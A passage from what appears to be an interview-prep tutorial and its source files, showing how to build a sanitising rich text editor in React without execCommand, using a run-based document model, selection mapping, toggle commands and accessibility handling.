      runs.push({ text: node.nodeValue, ...marks });
      return;
    }
    if (
      node.nodeType !== 1 ||
      node.tagName === "SCRIPT" ||
      node.tagName === "STYLE"
    )
      return;
    const m = MARK_TAGS[node.tagName];
    // a known mark adds a flag
    const next = m ? { ...marks, [m]: true } : marks;
    // anything else is unwrapped
    node.childNodes.forEach((c) => inline(c, next, runs));
  };
  // P, DIV, H1-H6, BLOCKQUOTE become "p"
  // blocks; UL/OL children become list blocks;
  // loose inline content directly in the root becomes a paragraph.
  // ...
}
\`\`\`

Two decisions do most of the work. Each tag is either a known mark, which becomes a flag on the run, or anything else, which is unwrapped to its text. So \`<span style="color:red">\`, \`<font>\`, and \`onclick\` attributes have nowhere to live in the model and disappear. \`<script>\` and \`<style>\` are skipped entirely, contents included. Browsers create a DIV element when you press Enter in some situations, so \`DIV\` is treated as a paragraph.

\`normalise(runs)\` then drops empty runs and merges neighbours with the same marks. After any command, \`Release\` + \`notes\` with the same marks is one run again, which keeps both the HTML and the offset maths simple.

📌 **Interview term: Sanitising by construction** — instead of a deny-list ("remove \`onclick\`, remove \`javascript:\` URLs..."), the output can only contain what the renderer knows how to write. Anything new an attacker tries is not on the allow-list, so it cannot appear. The same idea as a [tag tree parser](/interview-question/html-tag-tree-parser) that only builds known nodes.

### 4.2 Render: model to HTML

\`\`\`js
const esc = (s) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
function runHtml(r) {
  let h = esc(r.text);
  if (r.u) h = "<u>" + h + "</u>";
  if (r.i) h = "<em>" + h + "</em>";
  if (r.b) h = "<strong>" + h + "</strong>";
  return h;
}
\`\`\`

Marks always nest in the same order (\`strong\` outside \`em\` outside \`u\`), so two runs with the same marks always produce the same HTML. Consecutive list blocks of the same type share one \`<ul>\` or \`<ol>\`; an empty block renders \`<br>\` so it still has height and a place for the caret.

📌 **Interview term: Canonical form** — one fixed way to write any given content. It makes output comparable (the tests compare strings) and stops the \`<b><strong><b>\` pile-up that \`execCommand\` can produce.

### 4.3 The selection as model positions

The DOM Selection points at a node and an offset inside it, for example "text node \`tes are ready.\`, offset 3". After \`innerHTML\` is replaced, that node no longer exists. So before a command the selection is converted to **model positions** \`{ b: blockIndex, o: characterOffset }\`, and after rendering it is converted back:

\`\`\`js
const blockEls = (root) => [
  ...root.querySelectorAll(
    ":scope > p, :scope > ul > li, :scope > ol > li",
  ),
];

function toPos(root, node, offset) {
  const els = blockEls(root);
  const el = els.find((e) => e === node || e.contains(node));
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  // characters from the block start
  return { b: els.indexOf(el), o: r.toString().length };
}
\`\`\`

A \`Range\` from the start of the block to the selection point, turned into a string, counts characters across any number of nested \`<strong>\` and \`<em>\` elements. The reverse, \`toPoint\`, walks the block's text nodes with a \`TreeWalker\` until it has passed \`o\` characters.

📌 **Interview term: Selection and Range** — \`document.getSelection()\` is what the user has highlighted; \`getRangeAt(0)\` gives its start and end as \`(container, offset)\` pairs. Restoring a selection means building a new \`Range\` and calling \`removeAllRanges()\` then \`addRange()\`.

### 4.4 Commands are pure

\`\`\`js
export function toggleMark(blocks, sel, mark) {
  // [from, to) per block
  const parts = spans(blocks, sel).filter((s) => s.from < s.to);
  if (!parts.length) return blocks;
  const all = parts.every((s) =>
    marksAt(blocks[s.b], s.from, s.to).every((r) => r[mark]),
  );
  const next = blocks.map((bl) => ({
    ...bl,
    runs: bl.runs.map((r) => ({ ...r })),
  }));
  for (const s of parts) {
    const runs = [];
    let pos = 0;
    for (const r of next[s.b].runs) {
      // split each run at the span edges, flip the mark inside
      const cuts = [0, s.from - pos, s.to - pos, r.text.length].map(
        (c) => Math.min(Math.max(c, 0), r.text.length),
      );
      for (let k = 0; k < 3; k++) {
        const piece = r.text.slice(cuts[k], cuts[k + 1]);
        if (piece)
          runs.push({
            ...r,
            text: piece,
            [mark]: k === 1 ? !all : r[mark],
          });
      }
      pos += r.text.length;
    }
    next[s.b].runs = normalise(runs);
  }
  return next;
}
\`\`\`

The rule matches every word processor: if **every** selected character already has the mark, remove it; otherwise add it to all of them. So a selection that is half bold becomes fully bold on the first click.

📌 **Interview term: Run splitting** — a run that crosses a selection edge is cut into up to three pieces (before, inside, after). Only the middle piece changes, and \`normalise\` merges whatever ends up equal.

\`expandToWord\` turns a collapsed caret into the surrounding word before a mark command, and \`toggleList\` sets the type of every block the selection touches: to the list type, or back to \`"p"\` if they all already had it.

### 4.5 One entry point: \`runCommand\`

\`\`\`js
export function runCommand(root, cmd) {
  if (document.activeElement !== root) {
    // e.g. the user tabbed to the toolbar
    const saved = readSelection(root);
    root.focus({ preventScroll: true });
    if (saved) writeSelection(root, saved);
  }
  const blocks = parse(root);
  const sel = readSelection(root);
  if (!sel) return null;
  const next =
    cmd === "ul" || cmd === "ol"
      ? toggleList(blocks, sel, cmd)
      : toggleMark(blocks, expandToWord(blocks, sel), cmd);
  root.innerHTML = render(next);
  writeSelection(root, sel); // same model positions, new DOM
  return parse(root);
}
\`\`\`

The save, focus, restore dance came from a real failure. The first version called \`root.focus()\` and then read the selection. In jsdom, focusing the element reset the selection, so keyboard commands formatted nothing. Saving first and writing it back made the result independent of engine quirks. The Chromium run below exercises the same path: the user tabs to the toolbar, presses Space, and the selected word is still the one formatted.

### 4.6 The React layer

\`\`\`jsx
export default function RichTextEditor({ onChange }) {
  // React never renders children into this div
  const ref = useRef(null);
  const [active, setActive] = useState({
    b: false,
    i: false,
    u: false,
    block: "p",
  });

  function refresh() {
    const blocks = parse(ref.current);
    setActive(activeState(blocks, readSelection(ref.current)));
    onChange?.(render(blocks));
  }
  useEffect(() => {
    const root = ref.current;
    // guarded: StrictMode runs this twice
    if (!root.innerHTML) root.innerHTML = render(INITIAL);
    refresh();
    const onSel = () => {
      if (root.contains(document.getSelection()?.anchorNode)) refresh();
    };
    document.addEventListener("selectionchange", onSel);
    return () => document.removeEventListener("selectionchange", onSel);
  }, []);
  // ...
  return (
    <div className="rte">
      <div
        role="toolbar"
        aria-label="Formatting"
        aria-controls="rte-body"
      >
        {TOOLS.map((t) => (
          <button
            key={t.cmd}
            type="button"
            aria-label={t.label}
            aria-pressed={pressed(t.cmd)}
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => exec(t.cmd)}
          >
            {t.text}
          </button>
        ))}
      </div>
      <div
        id="rte-body"
        ref={ref}
        contentEditable
        suppressContentEditableWarning
        role="textbox"
        aria-multiline="true"
        aria-label="Release notes"
        onInput={refresh}
        onKeyDown={onKeyDown}
        onKeyUp={refresh}
        onMouseUp={refresh}
        onPaste={onPaste}
      />
    </div>
  );
}
\`\`\`

📌 **Interview term: Uncontrolled component** — React does not hold the editor content in state and does not render it. The DOM is the source of truth, and React reads it through a ref when it needs to ([controlled vs uncontrolled](/interview-question/what-is-the-difference-between-controlled-and-uncontrolled-components)). If the HTML were rendered from state with \`dangerouslySetInnerHTML\` on every keystroke, each render would replace the text nodes under the caret, and the caret position would be lost. This was not built and measured here; it is the reason every editor library avoids it.

Four details matter:

- **\`onMouseDown\` with \`preventDefault\`** on toolbar buttons. Clicking a button would normally move focus and collapse the editor selection before \`onClick\` runs. Blocking the default keeps it.
- **\`selectionchange\` on \`document\`.** It fires on the document, not the element, so the effect adds it there, checks that the selection is inside this editor, and removes it in cleanup ([effect cleanup](/interview-question/what-is-the-purpose-of-the-cleanup-function-in-useeffect)).
- **The \`innerHTML\` guard.** StrictMode runs the effect, its cleanup, and the effect again in development ([why StrictMode double-invokes](/interview-question/why-does-react-18-strictmode-double-invoke-your-components-and-effects)). The guard makes the second run a no-op instead of a reset.
- **Paste.** \`onPaste\` calls \`preventDefault()\` and inserts \`clipboardData.getData("text/plain")\` as a text node at the selection.

📌 **Interview term: Toolbar pattern** — \`role="toolbar"\` groups the buttons, \`aria-pressed\` makes each one a toggle a screen reader announces as "pressed" or "not pressed", and \`aria-label\` names the icon-only buttons.

## 5. Verified

**In jsdom** (React 19 StrictMode). jsdom has Selection and Range but no editing, so the driver set selections with the Selection API (firing \`selectionchange\`) and clicked real toolbar buttons and pressed real Ctrl+I keydowns. The paste event carried a fake \`clipboardData\` object, because jsdom has no \`DataTransfer\`. Vue and Angular printed identical lines:

\`\`\`text
initial: <p>Release notes for <strong>version 2</strong> are ready.</p><p>Fixed the date picker</p><p>Faster spreadsheet recalculation</p>
paste ' <b>bold?</b>' -> Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
select 'sion' -> pressed: b
Bold on 'Release' -> <p><strong>Release</strong> notes for <strong>version 2</strong> are ready. | selection kept: "Release" | pressed: b
select mixed -> pressed: none
Bold on mixed (makes all bold) -> <p><strong>Release notes for version 2</strong> are ready.
Bold again (removes) -> <p>Release notes for version<strong> 2</strong> are ready.
caret in 'notes' + Ctrl+I -> <p>Release <em>notes</em> for version<strong> 2</strong> are ready. | pressed: i
Bulleted list on 2 blocks -> <ul><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ul> | pressed: ul
Numbered list -> <ol><li>Fixed the date picker</li><li>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</li></ol>
Numbered again (back to paragraphs) -> <p>Fixed the date picker</p><p>Faster &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation</p>
U then I on 'Faster' -> <p><em><u>Faster</u></em> &lt;b&gt;bold?&lt;/b&gt; spreadsheet recalculation | pressed: i,u
model output after hostile insert -> <p>Hi <strong>there</strong></p>
\`\`\`

Reading it: the pasted \`<b>\` arrived as escaped text. Bold on a selection kept the selection. A mixed selection became fully bold, and the second click removed bold from exactly that selection, leaving \` 2\` bold. A bare caret in "notes" italicised the word. Lists went from paragraphs to bulleted to numbered and back. A hostile insert with a styled \`div\`, an \`onclick\`, a \`span\`, a \`<script>\` and an \`<img onerror>\` came out of the model as \`<p>Hi <strong>there</strong></p>\`.

**In headless Chromium 141** (playwright-core), with real key presses and mouse clicks on an esbuild bundle of the same files. Vue and Angular printed the same lines after their prefixes:

\`\`\`text
[chromium:react] version: 141.0.7390.37
[chromium:react] type ' Thanks!', Shift+Left x7, Ctrl+B -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks!</strong>
[chromium:react]   selection after: "Thanks!" | Bold pressed: true
[chromium:react] ArrowRight, type ' Bye' -> <p>Release notes for <strong>version 2</strong> are ready. <strong>Thanks! Bye</strong>
[chromium:react] click Bulleted list -> <ul><li>Faster spreadsheet recalculation</li></ul> | focus in editor: editor
[chromium:react] End, Enter, type 'New item' -> <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:react]   model output: <ul><li>Faster spreadsheet recalculation</li><li>New item</li></ul>
[chromium:react]   focused button: Italic
[chromium:react] Space on Italic -> <p><em>Fixed</em> the date picker</p> | focus back in editor: editor | selection: "Fixed"
[chromium:react] console errors: none
\`\`\`

This checks what jsdom cannot:

- Real typing after a command extends the bold run (\`Thanks! Bye\`).
- Pressing Enter inside a list item creates a new \`<li>\` natively, and the model reads it back.
- A keyboard-only user can Shift+Tab to Italic, press Space, and still get the selected word formatted, with focus back in the editor.

Visual styling and screen reader output were not checked.

## 6. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Caret with no selection | Mark commands format the word under the caret |
| Selection across blocks | \`spans\` gives a range per block; lists convert every touched block |
| Mixed marks | Add to all, then remove from all |
| Empty paragraph | Rendered as \`<br>\` so the caret has somewhere to go |
| Pasted or dropped markup | Plain-text paste; \`parse\` drops unknown tags and every attribute |
| Toolbar | \`role="toolbar"\`, \`aria-pressed\`, \`aria-label\`, shortcuts in \`title\` |
| Editor | \`role="textbox"\`, \`aria-multiline="true"\`, a label, a visible focus ring |

## 7. Common Pitfalls

- **Rendering the content from React state.** Every keystroke re-renders and the caret jumps. Keep the editable element uncontrolled.
- **Saving the Selection object or its nodes.** Those nodes are gone after \`innerHTML\` changes; save model positions instead.
- **Forgetting \`preventDefault\` on toolbar \`mousedown\`.** The click collapses the selection, and Bold has nothing to format.
- **Deny-list sanitising** (\`html.replace(/<script.*?>/g, "")\`). Attackers use \`onerror\`, \`javascript:\` URLs, and many more. Allow-list by construction instead ([how React handles XSS](/interview-question/how-does-react-handle-security-concerns-like-xss)).
- **Toggling per run instead of per selection.** Half-bold text flips into the opposite pattern rather than becoming bold.
- **Relying on \`execCommand\`.** It is deprecated, its output differs between browsers, and it is missing in test environments.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Reject execCommand:</strong> <span style="color:#f0e2c8;">"It is deprecated and its output varies by browser. Let <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">contenteditable</code> own typing and take control of formatting."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Model:</strong> <span style="color:#f0e2c8;">"Blocks of runs with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">b</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">i</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">u</code> flags, a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">parse</code> that keeps only known tags, and a canonical <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">render</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Selection:</strong> <span style="color:#f0e2c8;">"Convert the DOM selection to <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ block, offset }</code> before a command and rebuild a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Range</code> after rendering."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Pure commands:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleMark</code> splits runs at the selection edges, all-or-nothing; <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">toggleList</code> converts the touched blocks; a caret formats its word."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. React layer:</strong> <span style="color:#f0e2c8;">"An uncontrolled ref with no children, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">preventDefault</code> on toolbar <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mousedown</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">selectionchange</code> for <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-pressed</code>, and plain-text paste."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add undo and redo?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Direct DOM changes are not on the browser undo stack, so keep your own: push the model (or a diff) before each command and on typing pauses, and restore model plus selection on Ctrl+Z.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add links?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Add an <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">href</code> to runs, allow only <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">http</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">https</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">mailto</code> when parsing and rendering, and render <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">rel="noopener noreferrer"</code>. Never copy attributes through.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not render the model with React on every keystroke?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Re-rendering replaces text nodes under the caret and can interrupt IME composition (typing Japanese or Chinese, for example). Libraries that do render from a model, such as ProseMirror or Lexical, diff it into the DOM carefully and map selections, which is far beyond an interview.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">What about <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">beforeinput</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;"><code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">beforeinput</code> events with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">inputType</code> such as <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">formatBold</code> or <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">insertParagraph</code> let you intercept edits before the browser makes them, which is how model-first editors stay in control. This build lets the browser type and only intercepts formatting and paste.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you store the content?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Store the model as JSON, or store the rendered HTML and sanitise it again on the server. The client is never trusted.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Document model** | Blocks of text runs with mark flags |
| **Sanitising by construction** | Output can only contain what the renderer writes |
| **Canonical form** | One fixed HTML for the same content |
| **Selection and Range** | The highlighted area as container and offset pairs |
| **Run splitting** | Cutting runs at the selection edges before flipping a mark |
| **Uncontrolled component** | The DOM, not React state, holds the value |
| **Toolbar pattern** | \`role="toolbar"\` with \`aria-pressed\` toggle buttons |

For a read-only formatting pipeline, compare [Build a Markdown Previewer](/interview-question/build-a-markdown-previewer). For history on top of this editor, see [an undo and redo command stack](/interview-question/build-an-undo-redo-command-stack-for-a-text-editor).

---
**Conclusion:** A basic rich text editor without \`execCommand\` is a loop: parse the DOM into a small model, convert the selection to model positions, apply a pure command, render canonical HTML, and restore the selection. React's job is small and mostly restraint: leave the editable element uncontrolled, keep toolbar clicks from stealing the selection, and track \`selectionchange\` for the pressed states. The verified runs show the same output in jsdom and in real Chromium typing, and a hostile insert sanitised down to \`<p>Hi <strong>there</strong></p>\`.`,
        files: {
          "/App.js": `import { useState } from "react";
import RichTextEditor from "./src/RichTextEditor";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 680px; margin: 0 auto; padding: 20px 16px; }
  .rte { border: 1px solid #2c3340; border-radius: 10px; background: #171a21; overflow: hidden; }
  .rte-tools { display: flex; flex-wrap: wrap; gap: 4px; padding: 6px; border-bottom: 1px solid #2c3340; }
  .rte-tools button { background: #222834; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 6px; padding: 4px 10px; min-width: 34px; cursor: pointer; font: 14px system-ui, sans-serif; }
  .rte-tools button[aria-pressed="true"] { background: #f9a825; color: #1c140a; border-color: #f9a825; }
  .t-b { font-weight: 700; } .t-i { font-style: italic; } .t-u { text-decoration: underline; }
  .rte-body { min-height: 140px; padding: 10px 14px; outline: none; line-height: 1.5; }
  .rte-body:focus-visible { box-shadow: inset 0 0 0 2px #f9a825; }
  .rte-body p { margin: 0 0 8px; }
  .out { margin-top: 12px; font: 12px ui-monospace, monospace; color: #9aa4b2; white-space: pre-wrap; word-break: break-word; }
\`;

export default function App() {
  const [html, setHtml] = useState("");
  return (
    <main className="page">
      <style>{css}</style>
      <h1 style={{ fontSize: 18 }}>Write release notes</h1>
      <RichTextEditor onChange={setHtml} />
      <p className="out" data-testid="out">
        {html}
      </p>
    </main>
  );
}
`,
          "/src/editor.js": `// A tiny document model for a contenteditable editor, used instead of the
// deprecated document.execCommand. The DOM owns typing; formatting commands
// read the DOM into a model, change the model, and write normalised HTML back.
//   block = { type: "p" | "ul" | "ol", runs: [{ text, b, i, u }] }
const MARK_TAGS = { STRONG: "b", B: "b", EM: "i", I: "i", U: "u" };
const sameMarks = (x, y) =>
  !!x.b === !!y.b && !!x.i === !!y.i && !!x.u === !!y.u;
const textLen = (block) => block.runs.reduce((n, r) => n + r.text.length, 0);

function normalise(runs) {
  const out = [];
  for (const r of runs) {
    if (!r.text) continue;
    const prev = out[out.length - 1];
    if (prev && sameMarks(prev, r)) prev.text += r.text;
    else out.push({ text: r.text, b: !!r.b, i: !!r.i, u: !!r.u });
  }
  return out;
}

// DOM -> model. Anything that is not a known block or mark is unwrapped to
// its text, so pasted spans, styles, scripts and attributes never survive.
export function parse(root) {
  const blocks = [];
  let loose = null; // inline content sitting directly in the root
  const inline = (node, marks, runs) => {
    if (node.nodeType === 3) {
      runs.push({ text: node.nodeValue.replace(/ /g, " "), ...marks });
      return;
    }
    if (
      node.nodeType !== 1 ||
      node.tagName === "SCRIPT" ||
      node.tagName === "STYLE"
    )
      return;
    const m = MARK_TAGS[node.tagName];
    const next = m ? { ...marks, [m]: true } : marks;
    node.childNodes.forEach((c) => inline(c, next, runs));
  };
  const flush = () => {
    if (loose) {
      blocks.push({ type: "p", runs: normalise(loose) });
      loose = null;
    }
  };
  root.childNodes.forEach((n) => {
    const tag = n.nodeType === 1 ? n.tagName : "";
    if (tag === "UL" || tag === "OL") {
      flush();
      n.querySelectorAll("li").forEach((li) => {
        const runs = [];
        li.childNodes.forEach((c) => {
          if (c.nodeType !== 1 || (c.tagName !== "UL" && c.tagName !== "OL"))
            inline(c, {}, runs);
        });
        blocks.push({ type: tag.toLowerCase(), runs: normalise(runs) });
      });
    } else if (
      tag === "P" ||
      tag === "DIV" ||
      /^H[1-6]$/.test(tag) ||
      tag === "BLOCKQUOTE"
    ) {
      flush();
      const runs = [];
      inline(n, {}, runs);
      blocks.push({ type: "p", runs: normalise(runs) });
    } else if (tag === "BR") {
      flush();
    } else {
      if (!loose) loose = [];
      inline(n, {}, loose);
    }
  });
  flush();
  return blocks.length ? blocks : [{ type: "p", runs: [] }];
}

const esc = (s) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
function runHtml(r) {
  let h = esc(r.text);
  if (r.u) h = "<u>" + h + "</u>";
  if (r.i) h = "<em>" + h + "</em>";
  if (r.b) h = "<strong>" + h + "</strong>";
  return h;
}
// Model -> HTML. Consecutive list items of the same type share one list.
export function render(blocks) {
  let html = "",
    open = null;
  for (const bl of blocks) {
    const inner = bl.runs.length ? bl.runs.map(runHtml).join("") : "<br>";
    if (bl.type === "p") {
      if (open) {
        html += "</" + open + ">";
        open = null;
      }
      html += "<p>" + inner + "</p>";
    } else {
      if (open !== bl.type) {
        if (open) html += "</" + open + ">";
        html += "<" + bl.type + ">";
        open = bl.type;
      }
      html += "<li>" + inner + "</li>";
    }
  }
  return html + (open ? "</" + open + ">" : "");
}

// ── Selection <-> model positions { b: block index, o: character offset } ──
const blockEls = (root) => [
  ...root.querySelectorAll(":scope > p, :scope > ul > li, :scope > ol > li"),
];

function toPos(root, node, offset) {
  const els = blockEls(root);
  if (node === root) {
    // caret between blocks: snap to the start of the next one
    const b = Math.min(offset, els.length - 1);
    return { b: Math.max(b, 0), o: 0 };
  }
  const el = els.find((e) => e === node || e.contains(node));
  if (!el) return null;
  const r = document.createRange();
  r.setStart(el, 0);
  r.setEnd(node, offset);
  return { b: els.indexOf(el), o: r.toString().length };
}
function toPoint(root, { b, o }) {
  const el = blockEls(root)[b];
  const walk = document.createTreeWalker(el, NodeFilter.SHOW_TEXT);
  let n,
    seen = 0,
    lastText = null;
  while ((n = walk.nextNode())) {
    lastText = n;
    if (seen + n.nodeValue.length >= o) return [n, o - seen];
    seen += n.nodeValue.length;
  }
  return lastText ? [lastText, lastText.nodeValue.length] : [el, 0];
}
export function readSelection(root) {
  const s = document.getSelection();
  if (!s || !s.rangeCount || !root.contains(s.anchorNode)) return null;
  const r = s.getRangeAt(0);
  const start = toPos(root, r.startContainer, r.startOffset),
    end = toPos(root, r.endContainer, r.endOffset);
  return start && end ? { start, end } : null;
}
export function writeSelection(root, sel) {
  const r = document.createRange();
  r.setStart(...toPoint(root, sel.start));
  r.setEnd(...toPoint(root, sel.end));
  const s = document.getSelection();
  s.removeAllRanges();
  s.addRange(r);
}

// ── Commands (pure: model in, model out) ──
const collapsed = (sel) =>
  sel.start.b === sel.end.b && sel.start.o === sel.end.o;
const isWordChar = (ch) => !!ch && ch !== " ";

// A caret with no selection formats the word it sits in, like Google Docs.
export function expandToWord(blocks, sel) {
  if (!collapsed(sel)) return sel;
  const text = blocks[sel.start.b].runs.map((r) => r.text).join("");
  let s = sel.start.o,
    e = sel.start.o;
  while (isWordChar(text[s - 1])) s--;
  while (isWordChar(text[e])) e++;
  return { start: { b: sel.start.b, o: s }, end: { b: sel.start.b, o: e } };
}

// Character spans [from, to) of each block touched by the selection.
function spans(blocks, sel) {
  const out = [];
  for (let b = sel.start.b; b <= sel.end.b; b++)
    out.push({
      b,
      from: b === sel.start.b ? sel.start.o : 0,
      to: b === sel.end.b ? sel.end.o : textLen(blocks[b]),
    });
  return out;
}
function marksAt(block, from, to) {
  // marks of every character in [from, to)
  const res = [];
  let pos = 0;
  for (const r of block.runs) {
    const a = Math.max(from, pos),
      z = Math.min(to, pos + r.text.length);
    if (a < z) res.push(r);
    pos += r.text.length;
  }
  return res;
}
export function toggleMark(blocks, sel, mark) {
  const parts = spans(blocks, sel).filter((s) => s.from < s.to);
  if (!parts.length) return blocks;
  const all = parts.every((s) =>
    marksAt(blocks[s.b], s.from, s.to).every((r) => r[mark]),
  );
  const next = blocks.map((bl) => ({
    ...bl,
    runs: bl.runs.map((r) => ({ ...r })),
  }));
  for (const s of parts) {
    const runs = [];
    let pos = 0;
    for (const r of next[s.b].runs) {
      // split each run at the span edges, then flip the mark inside
      const cuts = [0, s.from - pos, s.to - pos, r.text.length].map((c) =>
        Math.min(Math.max(c, 0), r.text.length),
      );
      for (let k = 0; k < 3; k++) {
        const piece = r.text.slice(cuts[k], cuts[k + 1]);
        if (piece)
          runs.push({ ...r, text: piece, [mark]: k === 1 ? !all : r[mark] });
      }
      pos += r.text.length;
    }
    next[s.b].runs = normalise(runs);
  }
  return next;
}
export function toggleList(blocks, sel, type) {
  const all = spans(blocks, sel).every((s) => blocks[s.b].type === type);
  return blocks.map((bl, i) =>
    i >= sel.start.b && i <= sel.end.b ? { ...bl, type: all ? "p" : type } : bl,
  );
}
// What the toolbar shows as pressed for the current selection.
export function activeState(blocks, sel) {
  if (!sel) return { b: false, i: false, u: false, block: "p" };
  let runs;
  if (collapsed(sel)) {
    const bl = blocks[sel.start.b],
      o = sel.start.o;
    runs = marksAt(bl, Math.max(o - 1, 0), Math.max(o, 1)).slice(-1);
  } else
    runs = spans(blocks, sel).flatMap((s) =>
      marksAt(blocks[s.b], s.from, s.to),
    );
  const has = (m) => runs.length > 0 && runs.every((r) => r[m]);
  return {
    b: has("b"),
    i: has("i"),
    u: has("u"),
    block: blocks[sel.start.b]?.type || "p",
  };
}

// One entry point for the UI: read DOM + selection, apply, write back, restore.
export function runCommand(root, cmd) {
  // A keyboard user may have tabbed to the
  // toolbar. Focusing the editor can move
  // the caret in some engines, so save the selection first and put it back.
  if (document.activeElement !== root) {
    const saved = readSelection(root);
    root.focus({ preventScroll: true });
    if (saved) writeSelection(root, saved);
  }
  const blocks = parse(root);
  let sel = readSelection(root);
  if (!sel) return null;
  if (cmd === "b" || cmd === "i" || cmd === "u") {
    const target = expandToWord(blocks, sel);
    const next = toggleMark(blocks, target, cmd);
    root.innerHTML = render(next);
    writeSelection(root, sel); // the caret stays where the user left it
  } else {
    root.innerHTML = render(toggleList(blocks, sel, cmd));
    writeSelection(root, sel);
  }
  return parse(root);
}
